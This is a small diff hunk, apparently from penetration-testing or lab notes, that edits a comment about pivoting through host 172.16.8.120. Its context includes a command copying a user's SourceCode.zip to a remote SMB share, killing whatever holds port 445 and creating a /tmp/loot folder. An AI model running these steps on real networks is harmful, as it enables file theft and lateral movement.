@@ -155,7 +155,7 @@ copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
 
 ```bash
 # this is for pivoting host 172.16.8.120
-# window -> 172.16.8.120 
+# window -> 172.16.8.120 -> linux
 # linux
 sudo fuser -k 445/tcp 2>/dev/null
 mkdir -p /tmp/loot
